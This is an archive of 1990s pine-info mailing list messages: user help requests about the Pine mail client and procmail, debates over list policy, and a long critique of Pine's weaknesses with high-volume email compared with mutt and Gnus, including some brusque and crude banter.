account.  Do you have Fetch or any other file transfer software
on your machine?  Use it to transfer the file to the home
directory of your Unix account.  Be sure to specify the filetype
as binary.  Then open a compose screen in Pine, and type the name
of the file you uploaded in the Attchmnt: field and hit enter.
You should see the filepath in the Attchmnt: field.  Then send
the message as usual.  

Let me know if you need specific instructions for using Fetch.

Gah.  Robin, are they not feeding you or something?  Get some
lunch.

Jennifer, there is nowhere near enough information in your query
to even begin to answer.  What happens when you try to email the
addresses that were working earlier and aren't now?  Is mail
bouncing back to you?  If so, forward me one of the bounced
messages with full headers on, and I'll see what I can tell from
it...

Yes, as long as you haven't exited pine. Just go to the deleted message
and type in "U".

If you have exited pine... then it will be too late!

Well the attachment problem becomes tricky.  Are you using the mac to
access another server?  If so the commands for doing that command on the
PC will be the same. 
Beginnning of a Rant 
 Your helpdesk people should beable to tell you how
to do that.  Ask them to figure it out.  That is what they are paid for.
They are just going to have to buckle down and learn how.  That is how I
have had to figure things out.  It would be convient everytime someone ask
a question I dont know to be able to say that.  They should be able to
figure it out if they play with for probably 5 minutes max

Is there anyway I would be able to get a copy of a letter that came 
from your server?  I don't know how to get it any other way.  When it 
was originally sent to me, it took up more space than my screen would 
allow.  I could read most of it, but I missed some of the text that 
went off my screen.

When we discussed the split of pine-info and comp.mail.pine a while
back, the consensus was to try to shift the pine-info focus toward
Pine/System administrators and "power users."  At least that was the
consensus among the Pine Team ;-)  That would seem to make it
appropriate to put some sort of (low) hurdle between pine-info
subscribers and joe-random-user....

I am joining in a bit late, but the Usenet isn't really worth it. I
serached Dejanews for a whole week for info regarding pine and pgp with a
slow 9.6 kbps link shared by 100 people and what i got were a measly 6-7
messages that didn't even start to answer my question. One post here and
my question gets answered in the first hour. Great, isn't it. BTW, at the
pine-info web site, how does one do a search. There isn't any search form
that I could see.

TIA,

sachin

We, random people around the world who want to discuss the technical
aspects of Pine and who are totally unfamiliar with the mail service at
your University, have no idea.

Please try asking your local computer support centre.

OK....I understand.  However, I don't think it "practical".  I say that since 
many folks are still using 3.91 and I expect that even a larger portion are using 
and will continue to use 3.96.  The "documentation" that comes with these doesn't 
indicate that the mailing list is for "power" users and if you put the up this 
low hurdle then the newbies don't get serviced.  Unless, of course, you will have 
the listserver sending explict instuctions telling them that they must subscribe 
before they ask.  But, once you do that it is no longer for power users...is it?

I need some info on configuring a .procmailrc file:

Here is the problem:
For each mail message it processes, procmail should append the following
information to a file:
1) Who sent the messsage
2) The subject line of the message
3) The final folder the message was delivered to

How do I create this append statement?  Any help or reference to another
source is appreciated.
Thanks much,

On the page at http://www.washington.edu/pine/pine-info/ there are two
buttons:

[search] the archived messages' full text 

	and

[search] the archived messages' subjects only 

that take you to search-input pages.  Note: These are only for searching
the Pine-Info archives; the rest of the Pine Information Center has a
searchable index accessible via the [search] button on its homepage.

Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
X-Listprocessor-Version: 8.1 beta -- ListProcessor(tm) by CREN

Hi,
	It appears that none of the last several releases of Pine when built
using the 'osf' machine-type on Digital UNIX 4.0b properly recognize the
'saved-msg-name-rule' option in .pinerc.  It seems every time Pine
starts it overwrites whatever the user last chose for the option and
replaces it with the 'by-from' option.  Is this a known bug?  

By the way, is their a known-bug list out there somewhere and where do
we report bugs?  I looked through the docs, Washington's web site, etc.
and couldn't find a good place for reporting this.  Or is this where
bugs are to be reported?

Please respond by e-mail to me in addition to the list please.

Jeff Long

Ahh, but I agree with the questioner.  This doesn't work for me either.

You go to this link, and then you see another link.  Follow that link, and
then it'll take you back to the page you just left, this one!

There is one other link, but that heads off nowhere.

The problem you have is that your system is as open as a barnyard. In
case you forget your password, just send me an email.

P.S. Is that a "power user" question, or is it a "sys admin" question, 
Ed?

I just started using PINE at my university.

I initializated my configuration with my Personal Name ("Paolo Crespi")
but when I reply to a person in a newsgroup, the sender field is filled
(for example) with
                         To: it.comp.java
instead of my personal name.

What I have to do?

Please reply soon!

Thanks

*argl* Read the faq: 

<http://www.washington.edu/pine/> 

or grab a printable version of it off my website:

<http://franck.pc.uni-koeln.de/~robin/pine.html>

Then come back if you've either become a power user or a sysadmin. The 
correct place to ask this kind question is

<news://comp.mail.pine>

OK,
	Problem found.  We were using an old pine.conf file containing a
elm-style-save="yes" line which causes newer Pine to ignore the
saved-msg-name-rule option and in fact overwrite it each time Pine
starts.

Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Hi,
	It appears that none of the last several releases of Pine when built
using the 'osf' machine-type on Digital UNIX 4.0b properly recognize the
'saved-msg-name-rule' option in .pinerc.  It seems every time Pine
starts it overwrites whatever the user last chose for the option and
replaces it with the 'by-from' option.  Is this a known bug?  

By the way, is their a known-bug list out there somewhere and where do
we report bugs?  I looked through the docs, Washington's web site, etc.
and couldn't find a good place for reporting this.  Or is this where
bugs are to be reported?

Please respond by e-mail to me in addition to the list please.

Jeff Long

    Hi there:

      I want you to do me a favor, please.

      I'm working with hypermail, but I have a problem compiling e-mails
because it doesn't accept special characters, for instance, when you are
working in a html document, you use &aacute; or &ntilde; for special
letters ( and ). In my case, I want hypermail to compile with those
special characters. What can I do??? Do I need a special software or do
I have to configure hypermail?????

        Help me, please.


                Atte. Ivan Figueroa.

You are asking questions about "hypermail" on the "pine" mailing list??
I think you have the wrong "number".

If you were licking *my* shoes, you must've been in the closet doing it,
and I have to wonder how long it'll take you to get all that dust out of
your mouth.

Trample you?  Not a bad idea!

Smother you with my ass?  Well, you're close!

...and, uh, Chaz, the 't' key is to the LEFT of the y!

Geez, if you're 6/1 and 195 pounds you must be about as fat as me!  No
wonder you can't get any.

> have black hair and really need a mistress.

Gee, mine's dark, but I don't think it's black.  Maybe you should see a
doctor about that.

As for the mistress, what do you expect to do with her if she's in
here...suck her cyberbits?!!

I was using Lynx 2.7. With that, I didn't get the form. Using Netscape
3.01, I am getting the form. My OS is Linux 2.0.30.

Hope this info helps you in tracj\king down the problem.

Shouldn't pages like these be browser-independent? The html used on
this page isn't valid, btw.

May I kindly suggest using the standard mask glimpse http comes with
instead of the script you're using on this site? It's really handy and 
stuff and can be found here:

Dear representative,

I have a plan to make an unified messaging client supporting fax and
voice as well as pop3 mail.

To shorten time, we chose Microsoft Exchange Server as messaging server
and outlook as client.

Now all we have to do is add some functionallities to Exchange server and
Outlook client.

Regarding voice and fax side, we have an OCX to build respective features.

It would be very appreciated that you give me a comment about this.

Thank you so much.

Sincerely,

Jaison Kim

A wise choice. Using MS ES will certainly shorten time.

Yes. There is an old German saying: "A functionality a day keeps the
doctor away". With respect to this, I think that an fdisk button would
be quite appropriate. You might also consider an any key key.

Very good. Konfuse says: "Building respective features is a sign of
wisdom". You should stick to that.

With Lynx, you (should ;-) get a prompt at the bottom of the screen saying

	"This is a searchable index.  Use S or s to search."

After pressing the "S" key, you enter your query, just as you do in the
text box you get with graphical browsers, and hit Enter.  (You didn't get a
form because there really *is* no HTML form -- these two input pages use
the <ISINDEX> method.)

Hi there,

since we are currently witnessing a *heated* debate into which direction
this list should be going (hello, Ed...), I'd like to draw your attention
to something that is being brought up at least once a week: forging one's
own mail address to "fight spam". Now, I do it to, but according to what
Justin Sheehy has imvho quite gracefully put in his posting to c.e.g.

My suggestion would be to cancel all messages that have illegal
headers. If this list is to discuss "serious" matters, one should
expect the writers to know what they're doing, i.e. to have read
their RFCs.

In the same vein, I think that messages from root@foo.bar ought to be
cancelled. I for one haven't seen anything senseful coming from either 
side, yet.

Now hate me }:->

Cheers,
Robin

I have included the relevant secyions of RFC 1036 below.
By real address, I am thinking of a working electronic mail address
that will reach the poster.

Incorrect.

It requires that your header contains "the electronic mailing address
of the person who sent the message".  I read this as "a correct,
functioning address that will reach the person who sent the message".
If an RFC states that you need to provide something, it should not
also have to specify that the something in question actually work.

That is an acceptable solution to me, although actually scanning that
mailbox before mass-deleting might be a good idea.

***
RFC 1036              Standard for USENET Messages         December 1987

2.1.1.  From

    The "From" line contains the electronic mailing address of the
    person who sent the message, in the Internet syntax.  It may
    optionally also contain the full name of the person, in parentheses,
    after the electronic address.  The electronic address is the same as
    the entity responsible for originating the message, unless the
    "Sender" header is present, in which case the "From" header might
    not be verified.

2.2.2.  Sender

    This field is present only if the submitter manually enters a "From"
    line.  It is intended to record the entity responsible for
    submitting the message to the network.  It should be verified by the
    software at the submitting host.

***

Thus, if neither of those headers contains your email address, then
you or your software is not compliant with the most important RFC for
usenet messages.

I do not wish to aid people in acting in a way that is clearly
incorrect and inconsiderate.  I am not trying to stop them, but
neither will I aid them in their futile movements.

Yes. This phenomenon is called UCE (unsolicited commercial email) or

talk to you system administrator to have him take appropriate
measures.

Yes. You have to talk to your sys admin, again. If that's what you
mean. The name that appears in your messages can be changed if you
goto M(ain) S(etup) C(onfig) and ... well - change it :-)

BTW, all caps are considered SHOUTING, you know ;-)

This group is generally not suited to the questions you have.

Talk to your sysadmin or forward his emails to the appropriate
addresses (postmaster@..., abuse@... and so on). That should
help. Demand that the person's account be voided.

Well, there isn't too much we can do about that.  It is a "local" issue.

Yes, Robin can be helpful as long as his cat doesn't vomit on his
keyboard.  :-) :-)

You have not managed to change your "user name".  You have only changed
your "Personal Name".  Your username (the name your system knows you as)
is still "rrakkar".  To change that you will have to talk to your sys
admin.

Hi,

Sometimes when I tell Pine to eXpunge, I get the "*" in the left corner of
the window for a long time (20sec,30sec and even more). Even for a one
file expunging. I checked the cpu load and it is almost 0 !
Is it a Pine problem or a system one ?

Is there a way to tell Pine to expunge in the background, so I can
continue working meanwhile expunging ?


Thanks,

Yossi Itzkovich

Hi there,

I just came across this essay by the esteemed Lars Wirzenius and found it
interesting with respect to pine. I thought I'd put this to discussion in
this forum since I find pine definitly *not* capable of dealing with
large amounts of email. I'm talking 500+ mails a day. Whenever I thought
pine would do the job, I marked the paragraph with a +, when I thought it
didn't, with a - (or -- when pine just plainly sucked). I've marked my
comments with ** 

If you think this mail sucks - no biggie, just drop dead. Actually,
I'd rather hear some constructive criticism, because there hasn't been
much input from the list afaics, except for some creeps whining for
better header munging support. 

So here it goes...

Have a nice Sunday all,
Robin

     _________________________________________________________________
                                      
         Lars Wirzenius, last modified 19 October, 1997.

Some notes about handling large amounts of e-mail
   I used to get a lot of e-mail. At one point, I got around 650 e-mail
   messages per day, from various high and low volume mailing lists, or
   directly from people. I've since cut down my e-mail intake to less
   than a hundred per day, but I think I have some insight on what is
   needed for dealing with large amounts of e-mail.

Automatic filtering
-- When the e-mail comes via many lists, it is imperative that there is a
   way to automatically filter e-mail to different folders, so that lists
   can be separate, and so that it is easier to do important lists first.
-- Filtering does not have to be based only on the list, so the criteria
   should be flexible enough to allow other sorts of filtering as well.
   At least, one should be able to filter based on any header and the
   presence or absence of a string in that header.
** procmail is ok, but not available on some systems. XFmail's stuff
** is a good example how to make filtering user-friendly.
-- The mailer must be able to show which folders have new messages, and
   preferably how many.
** I would have added a couple more minuses if I had the place. Pine's 
** behaviour here is totally braindead - and tabbing is *not* what I
** want when reading a hv-list.

Proper threading
-  When viewing a long discussion, it helps understanding it immensely
   if the messages are shown in a logical order: a reply is shown
   immediately after the message it is a reply to. Merely sorting
   messages by subject and date is not good enough.
** Amen   
-  Most mail user agents add an In-Reply-To or References header when
   replying to a message, and add the Message-ID of the replied-to
   message to that header. This can be used to construct a tree of the
   discussion, with replies being children of the message they are
   replies to.
** mutt does a good job here   

Many inboxes
+  The mailer should be able to fetch mail from several locations: a
   traditional spool file or from POP or IMAP mailboxes. All at the
   same time, and without getting confused even if they may contain
   the same messages.

Form letters
-  Many people will ask identical questions, and the mailer should
   provide some support for using form letters. The easier, the better.
** Have I mentioned Gnus today, yet? However, I don't see form letters 
** as a vital point - except that Gnus' junk.el _really_ kicks ass.

Different sender addresses, signatures, etc
-  One often needs to have slightly different personalities in different
   contexts, and the headers and signatures of the letters should reflect
   this. For example, one might want to use a private address for personal
   mail (I use liw@iki.fi) than for business mail (liw@cs.hut.fi), even if
   the mail is actually processed at the same place.
** mutt, Gnus...

Easy to cut away extra addresses when replying
+  A common problem with mailing lists is that their messages collect
   large lists of Cc's. When person A sends a message, it lists only
   the list as a receiver. When B responds, his mailer adds A to the
   Cc list.  When C replies to B's message, his mailer adds B. And so
   on.
+  The mailer should make it easy to reply to messages on lists so
   that only the list is given as a receiver. (It should also be
   possible to keep the other addresses, of course.)

Good MIME support
   MIME is common enough that every mailer must support it, and it's
   so obviously a Good Thing that it should be supported well.
-+ The mailer should do its utmost to show any content type, including
   binary stuff. If nothing else, the mailer should show the printable
   parts of an unknown binary type (perhaps at request). Many bad
   mailers will put a bogus content type, but a good mailer will allow
   the receiver to process the mail anyway.
** better MIME support is under way (or so I've heard ;-)), but
** currently pine depends too much on hacking the mailcap. Especially
** html crap isn't handled well.
-  Supports for attachments (receiving and sending), various encodings,
   and so on, are essential.
** With Gnus, I can select several kinds of encoding types. This is
** certainly an advantage
Address completion
   Most mail user agents have some kind of alias feature, but that is
   not good enough. When you're having a large correspondence, it is
   impossible to define an alias for every person you ever discuss
   anything with.
+  Instead, the systems should keep track of all addresses in all
   messages and provide a way to search them. This works much better
   than aliases.
** pine's address book is pretty good. bbdb is better, of course,
** since it will let me search _and_ mark recipients by regexps.
   Aliases good for things that are needed often, but they break when
   there are too many of them, or when you use them rarely enough
   that you forget them.

Automatic expansion of aliases and local addresses
+  To prevent mistakes, the user interface for using aliases (if they
   are implemented at all) must expand the aliases automatically. This
   will make it much harder to use an alias by mistake.
-  Also, if an address is local, the system should expand it to show
   the full name of the local user, if possible. This also prevents
   mistakes.

Fast
-  When processing lots of mails, the mailer had better be fast. Even
   small delays cumulate to large irritation. Large amounts of mail
   will mean large folders, but that is no excuse for using much time
   to process them.
** mutt (in my experience, which is Intel Linux and Alpha Linux only)
** is faster. Pine tends to get _really_ slow when the inboxes get
** quite large. In fact, it took pine about 70% of the time to open a
** mailbox that Gnus needed to open, sort, score, kill, wash and
** thread the same mailbox.

Many folders
-  There will be a need to save messages in various folders for
   archival.  To keep things manageable, the folders have to be
   hierarchical, since a one-level structure breaks when there are
   many folders. There will be many.
** Ok, I can open several folder collections, but (and this goes along 
** with pine's lack of threading) this is not very "intuitive". My
** Gnus message tree is 100x easier to scan than the kluge I had with
** pine.[1]
+  It must be easy to select a different folder to view, and to copy
   and move messages between folders, one by one or en masse.  It must
   be easy to create, delete, rename and move folders.
   
Archiving, expiration
+- Moving messages one by one to archives is too much work for many
   messages. For example, when following an important mailing list, it
   may be necessary to archive all messages to it. The mailer should
   support this in some suitable way, e.g., by providing an `archive'
   button that move the messages from the folder with new messages for
   the list to its archive folder, or by making it easy to keep the old
   message in the same folder (but still keeping it easy to find the new
   stuff).
** Pine's archiving is ok, but an "archive now" function would be
** neat. Did I ever mention that lack of macros sucks?
-- At the same time, some lists do not require eternal archiving, so
   it is necessary to provide some automatic expiration of archived
   messages. The period of expiration needs to be settable for each
   archive separately, and it must not apply to all saved messages.
** Ok, here comes one of Gnus' strongest points: it expires mail and
** news alike, and in an intelligent manner. 
-- The archival and expiration should also be rule based, so that only
   messages matching some particular rules are archived or expired. For
   example, one might want to archive only messages whose subject
   contains "ANNOUNCE" or "IMPORTANT", or expire only messages that don't
   have such subjects.
** <rant> GnusGnusGnusGnus </rant>   

Searching
-- The archives should be searchable: full text searches, and for certain
   authors, subjects, dates, and other such criteria. One often needs to
   refer to old correspondence, but finding it in even a modest archive
   will be difficult, regardless of how it is organized, unless there is
   some way to search it in addition to just browsing it.
** XEmacs -> Gnus -> igrep -> >KeWL<   

Who said what? Did I say that?
-  The mailer must keep copies of all messages sent, and save replies
   with the replied-to messages. It must be able to find messages
   written by a certain author, and find messages that are replies to
   a given message, or the message that a given message is a reply to,
   whether in the same folder or not.
** Pine's behaviour is ok, except for the latter part of this paragraph.  

Many concurrent operations
+  It must be possible to start several concurrent drafts at once,
   and to suspend and continue writing on the drafts at will. And,
   while writing, one must still be able to view other messages, move
   messages around and delete them (including the one being replied
   to), and otherwise function normally.
-  It must be possible to view several messages at once, and have several
   folders open at once.
** Running multiple copies of Pine is just not it, is it?   

Compatibility
+  The larger the correspondence, the larger the diversity of the
   software the correspondents use. The mailer must spend much effort in
   being compatible with all of them.
** I don't quite get this, but I don't give a **** about being
** compatible with Microsuck. Pine handles u*ix mail ok, period.
+  The mailer should not store messages in special formats, unless
   absolutely necessary. It should use folder and message file formats
   that are compatible with other mailers, in case it is ever necessary
   to switch to another mailer.
   
Security
   In the global Interent, security is everyone's problem. Eavesdropping,
   forgeries, mailbombs, and such are commonplace. The mailer must do its
   best not to compromise security, e.g., by using APOP instead of normal
   POP, when the server supports APOP.
   
-- The mailer should provide support for encryption (at least using PGP,
   but other formats as well, if possible). The support should be as
   comfortable as possible: most of the time the user should just be able
   to ignore it. E.g., the mailer should keep the PGP password in memory
   (for some specified time), instead of asking the user to re-type it
   all the time. Also, the mailer should have an option to always encrypt
   messages, if the receiver's PGP key is known (but this should be
   overrideable).
** I'm getting the impression Mr. Wirzenius is using an Emacs mailer
** himself. Now, I've been deploring pine's pgp-integration for some
** time, but I can see why it isn't done. It still sucks.   

Spam filtering
-- The mailer should support spam filtering, some way or another.
** We've had this up there somewhere, but the point is still valid.

Easy list subscription and unsubscription
-  People active on the Internet will need to subscribe and unsubscribe
   to mailing lists all the time, and the mailer should make this easy.
   For example, when subscribing, it should offer to create a new folder
   and a filtering rule to place everything from that mailing list to the
   new folder.
-  On the other hand, one stays subscribed to some lists for a very long
   time, and it is easy to lose the unsubscription messages during that
   time. The mailer should make it easy to remember how to unsubscribe.
   
Bounce processing
+- The mailer should be able to process most common types of bounce
   messages (and DSN messages), and track which messages have not reached
   their destination. It should make it easy to re-send (possibly after
   editing the addresses), and to mark the offending addresses as
   non-deliverable in the address database.
** while Pine handles bounces ok, it does not do the database
** stuff. Needless to say that Gnus does, I gues...
   
Priority alarms, and other biffy features
-- The mailer should be able to recognize (some) important messages, and
   raise an alarm when such a message arrives. The user must be able to
   configure what is considered important and what is not, using the
   filtering mechanism.
-- The mailer should also be able to recognize unimportant new messages,
   and not signal them in intrusive ways (for example, by not beeping
   when such mail arrives, even if it changes the icon to show there is
   new mail).
** Score files. Pine needs score files and kill files. Badly.

I read well over 300 messages a day with pine and a collection of scripts
just fine.  But I'm of the "vi" school of thought, meaning I am completely
content augmenting and expanding my system through a series of external
programs.  It would appear you're from the emacs school of thought.  So
this is a somewhat religious argument ... but anyhow.

It's also worth noting that I'm in a position where I can set up an
always connected server exactly as I like it.  I could do this with a
periodically connected server (or desktop) as well, it's not that much
different.

Use procmail filtering, or use subaddressing via qmail or procmail (I
choose the latter, it's far more reliable).

Huh?  It works fine for me.  "Proper threading" depends on mailer features
that not all mailers use -- so the messages just simply do not have the
data in them to be threaded.  I found when I wrote a threading mail to
news gateway that the threads (as seen by trn) were pretty useless and
pine's "ordered subject" sorting did a better job.

Yep I need this too, so I added it.  See
<http://www.arctic.org/~dgaudet/patches/pine3.95dg3.patch>.

IMHO signatures are overrated... even if I didn't put this url here
you can probably derive my homepage from the From address.  So any
information I put into a signature is redundant.

Reply-To: for mailing lists has received a bad rap for reasons I can't
agree with.  In particular I think folks who accidentally send sensitive
private mail to the public Reply-To learn after one mistake.  If they
don't learn then they probably shouldn't be trusted with sensitive data
in the first place ;)  Pine deals with this excellently.

Ok I agree with you here.  Pine also has no way to override a display
filter.  For example I had a pgp display filter, however when PGP 5
came out and I hadn't had a chance to upgrade yet, and folks started
sending PGP 5 signed messages I could not read them at all... because
my display filter couldn't decode them.  I just ended up disabling the
filter until I could fix the situation.  It would have been nice to be
able to keep the filter but override it occasionally.

I have a very flat hierarchy, there is some depth, but it's mostly to
build a tree of archives.  All my incoming mail is automatically copied
to an archive of the appropriate inbox.  These archives are automatically
rotated and compressed (and marked read-only so that pine can deal with
them a lot more efficiently).

In my experience I'll dig through archives about twice a week, and
usually that's looking only at last week's mail which is easy to access.
This method allows me to completely avoid making the decision of what
I should keep -- I keep everything.  Then my inboxes essentially become
"todo" lists, and I rarely have to save messages elsewhere.

$300 gets you at least 1Gb of high quality scsi disk.  gzip -9 helps
wonderfully.  I doubt any human is really reading enough mail to fill
1Gb of disk with compressed archives.  Why make the decisions?  You
never know when you'll want a particular message.  I've dug things out
a year and a half later, and thanked myself that I just keep everything.

On small archives, maybe.  For something large the only solution is far
more complicated, and should involve technology like glimpse.  I
occasionally long for this, but it's only once a month or so that I
have to dig something out of long term compressed files.

Definately not.  In fact I can't stand pine's behaviour when you
accidentally start two of them.  There are many operations that I
used to perform in mh involving multiple message cross referencing
when generating a reply which I find a real chore in pine.  (Yes I
switched from mh to pine.)

I honestly believe that IMAP is the way of the future, and I consider
mailers without IMAP to be worthless.  For example, if your mail
environment involves NFS then you must not care about your mail -- because
NFS mail access is terribly unreliable.  The above is meaningless with
IMAP because you only care that your IMAP server is efficient -- you can
change the client without changing the files.  (qmail's Maildirs solve
NFS problems nicely, but are not a replacement for IMAP.)

If you spend time looking at pine's code you'll probably conclude it
has buffer overruns, some of which may be remotely exploitable.
I'm not saying for certain there's an exploit, I'll just say it's
something that worries me.

You can do this with any of the numerous pine+pgp wrappers and the display
filter and outgoing filter support.  The outgoing filters are trivial to
use, I just hit ^N or ^P to select one.  My filters do avoid re-asking
for the password, pine provides all the hooks necessary to only ask once.
(I use something called PAPP, use hotbot or something to find it.)

procmail.

I have a script "majorsub" which does all the magic required to subscribe
me to a majordomo-style list, and set up the folder.  Because I use
subaddressing the "filter" is created implicitly and is never wrong.

It is impossible to get a traditional (header based) mail filter right
without seeing the first message from a mailing list.  Your mailer
can try to guess... but guessing is a bad scene in my books.  Software
shouldn't try to guess what's right.  Even if it were to show you the
filter and say "is this the filter I should use?"  you probably won't
know the answer until you've seen the first message.

The first archive folder for each mailing list necessarily contains this
message.

You get that many bounces that this is an issue?  I get maybe a bounce
a week, out of 250 messages I sent.

Use procmail to trigger some external program... I generally let other
humans make the effort to tell me some other way when something is
really important.  If it's a machine that needs to tell me something is
important, it does it via pager.  i.e. you're not online 24 hours a day,
or at least you shouldn't be ;)  If it's important when you're logged
in then it's important when you're in the washroom, or out eating lunch,
so you better have an out-of-band signalling method ...

By the way, thanks guys over the mailing lists-coping topic.

Next thing is this.  I seemed to find procmail, hardly aware as I was that
it was there.

It says it is version 2.80.  Will that get me by?  Probably have to do
with it.

I tried 'man procmail' but that don't work.  No man pages for a good few

Since fine tools for filtering exist, it's not something I would like to see
added to pine. I don't understand your comment about tabbing.

This is a feature that should be added to pine. Please bear in mind, however,
that it won't result in proper threading, or an article tree. Linking an
In-Reply-To to a Message-ID will help a little. We can have proper threading
and an article tree in news, using trn for example, because many news messages
contain Message-IDs for all earlier messages in the thread, especially the
Message-ID that began the topic, to anchor the tree. Unfortunately, most
message composers fail to retain these necessary earlier Message-IDs.

Perhaps pine's behavior could be improved in this respect.

Yes, it will be lovely when we can pick and choose which attachments to include
in reply, or if they are merely plain text, merely inserted into the body of
the reply text.

But, dammit, sending html-encoded messages is such an abuse of e-mail that I
would rather pine continue to fail to support this, in the hopes that other
products that generate this code for mail composing will wither and die.

Hm. Good suggestion.

No. Use other filtering tools which do the job well.

Did you convert In-Reply-To to Reference headers?

How can "ordered subject" sorting do a better job? In-Reply-To sorting, where
it is possible, should be the superior rule, then ordered subject.

As it happens, trn will give you a choice: It allows messages to be ordered by
date and subject, or, subthreads are arranged within the article tree in date
order, based on the date of the anchoring message.

There are 2 choices to read messages within the article tree, either read
subthread after subthread, or read each first generation reply, followed by
second generation replies.

Without all those earlier Message-IDs retained, it is impossible to have a
proper article or message tree. But, if In-Reply-To exists, there is no
advantage to ignoring it.

Well, how about we figure out a way to be able to read messages fast and
quickly from Lynx and DN?  Must be some way.  Figure the Lynx people must
have provided a way to download all messages on a page, so you may read
off-line.

Of course, then there's also the recurring ...

**Bad HTML!!  Use -trace to diagnose. **

Which DN evidently didn't want to fix.  Yes, it was their mistake.  But
they wanted to keep it that way.

If In-Reply-To exists on all messages then I agree with you.  What's the
algorithm you'll use for those it doesn't exist on?

Note that a filter could be written which keeps a tree of message-ids in a
database based on in-reply-to, and from that generate a more complete
reference list.  But it's not perfect, mainly because in-reply-to isn't
always there... and because of that I find orderedsubject far more
reliable.

Yup.  If Pine can read separate folders, why can't it separate incoming
mail into those folders.  Seems to me it's only doing half the job right
now.

Along the idea of doing important lists first, I would like to ge able to
rearrange the folders so that the most important (or most active) could be
placed first, but it would be left up to the user as to which folder went
first, second, etc.  The way it is now, you have to delete folders and
recreate them in the new order.

It should be as flexible as procmail if it's going to be done at all:
filtering on any header, or even on a keyword in the body of the message.

I fully agree with this one.  I do that now with a script at login, which
is also available any time I'm at the prompt, but I think it would be nice
to have the mail program show me this when I start it so I know where I
need to go to read mail, and which folders have a *lot* of mail that needs
to be taken care of.

One final word on filtering, though.  I'd like to see Pine include mail
filtering since there's obviously a lot of interest in filtering out spam,
separating mailing lists, etc., but it needs to be easy for the newbies to
get set up.  Otherwise, it's no better than installing a 'filter' script
or installing procmail. 

On the other hand, I'd hate to see Pine get to be like some of today's
programs. Some of them try to do everything but wash your dishes, and they
end up being worthless for every task, not to mention crashing because
they *are* trying to do it all.  I'd rather keep Pine a fairly simple,
straightforward mailing-reading program if adding lots of bells and
whistles like filtering will just slow it down or cause a lot of problems.

Sounds good, but I'd also like to be able to sort the mail in their
folders differently from how I sort the newsgroup.  The way it is now, I
have to run Pine with a different .pinerc file to do that when reading
newsgroups.

I have to agree with Adam.  I'd like to see the html-encoded messages
disappear, but if they continue, then have Pine strip them off as an
option in the Setup / Config so we don't have to see them if we don't
want to.

It takes *way* too long to have it sort a newly-subscribed-to newsgroup.
Fortunately, I don't get tons of e-mail so that's not a problem for me,
but I can imagine that it *is* for some.

There are too many people who write in complaining about running out
of disk space.  I think there should be a way to have Pine archive /
delete old mail.  It should be set up to check for any mail in any
folders that it older than a given time period.  This, like other
things, should be settable in the Setup / Config.

This *would* be a nice feature, but I think making the process of
creating a new folder should suffice.  If filtering is added to Pine
eventually, being able to add the new list to the filter *would* be a
good thing to have.  Then it could create a new folder automatically,
or prompt the user to choose from the existing ones.

This, too, would be a nice feature, but I think a simple *save* of the new
subscriber info. should be appropriate.  Besides, one can always mail to
the list and ask how to unsubscribe...someone out there can help them out.
I would, therefore, consider this another 'bell' or 'whistle' that I
personally could live without.

Again, filtering would help this.

Excellent idea!

Overall, I like Pine, especially its range of user-settable features.  I
think that's the number one feature that makes me use Pine over any other
program.  If I want to be able to set something a certain way, I usually
can.  On the other hand, if I'm a clueless newbie who just wants to be
able to read mail, they can do that.  The settings are there and, when
they learn more about Pine (as I did from this mailing list), they can
adjust things to suit their tastes. 

I would like to see Pine have *some* sort of filtering available, again
with the option to use or not use it, and with the flexibility of procmail
or Eudora Pro's filtering.  However, I'd hate to see Pine get to be so
'busy' that it has more features (read problems) than are absolutely
necessary to keep it a simple, yet reliable mail tool.

Maybe I was also including the idea of arranging real old mail, may wish
to refer to sometime in the future, or use as boilerplate potential text
material to add in future mail.  But month old or more, so you have to
download it. 

Do you people just download folders every month?  Or download bundles of
(E)xported mail?

Ok.  Gone through steps: 1-7.  Now, the test did not work.  No file
appears in my 'mail' directory.  And no file appears in my '.procmail'
directory.  I tested a whole bunch of times.  And a bunch of mail, all
mail I sent to myself, appeared all in my INBOX.

I don't think there's any typos I made in any files I created.

Help!  ;-)

Wrong list here, but I get the impression you'd rather read the docs
again. Era Eriksson and some other people from the procmail list have
put together very nice tutorials/how-to's and stuff. Do a websearch
for those. Also, try to grab a tool called dotfile-generator. It might 
be helpful in the beginning. And don't forget to put procmail on
verbose and check the logs.

It means I have a cat that on and off smiles at me and then throws up

R> Ed thanks alot Ed, what happened to my buddy Robin?

Same as every weekend. Got bored, got drunk, fell asleep. 2x

Listproc does send back instructions if the sender is not subscribed
to a subscriber-post list.  Currently that text can't be customized on
a per-list basis, but the listproc support guys claim better
customization is coming RSN...

Admittedly the hurdle is pretty low, but you might be suprised how

No. I used to use pine. Until I started subscribing to high volume

That's not the point. I do the same. Still, pine and slrn couldn't
handle the load. I'm still looking for a nice, fast cli mail
reader. Mutt is ok, but I like pine and would like to see it improve
to a point where I can use it without heavy procmailing and digestion
problems when the next 100 mails come in.

As I said, that's out of the question for novice users, and too much

Not in my experience. Ever tried mutt? I mean - order by subject is
kinda nice, but you loose all the subthreads - and you don't get
visualization of hierarchies. Not good.

Too much of a hassle. Gnus gives me clickable urls and mail
addresses, the latter being of importance in an age of braindead

That's one of pine weakest spots imvho. I had pgp5 running in no

And just how much time did it take you to create the scripts? I lost 2

Sorry, but that's not an argument. The list keeps getting "quota"
questions. A smarter archiving mechanism is badly needed. And deeper
hierarchies, too. I want to have *one* Archive and then mail/news, and 
then months, but also...

Not a valid argument. I got 9 GB here, but that's not the point. With
pine, this amount of mail simply cannot be handled. I ended up tweaking
Apache to eat gz's and converted everything with MHonArc, with webglimpse
as search engine. Flashy, but it sucked like hell...

Aldo and I are good friends, but guess which mailer he now uses?  Besides,

I have that, and it's ok, but I hate procmail. ;-) XEmacs has nice
biffy stuff like that, like a yellow envelope with a number beside
it. What more could you ask for?

I don't like to jump around blindly amidst 200 or so messages, when it

fetch just the headers if needed, and that's really fast.

Even better: Gnus' adaptive scoring. It remembers which folders you

That's not procmail's domain. Overkill. You can use elm's filter for
such primitive tasks.

Another one for a page on the pine site, right? Alternately, I'd
volunteer to collect this stuff (Sven, would you?) and put all the
links on my server. I feel this would be a Good Thing to have. Also,
I'd like to put "good" pinercs there.

But XEmacs *is* simple. It's kinda big, allright, but it's simple and
customizable. Hey, this is not MS-Country, you know? ;-)

I see it just the other way around. Why not have a "I'm scared, give

hated sitting there re-configuring pine after I lost one pinerc.

Again, mutt, XFmail and Gnus handle this stuff well, without being
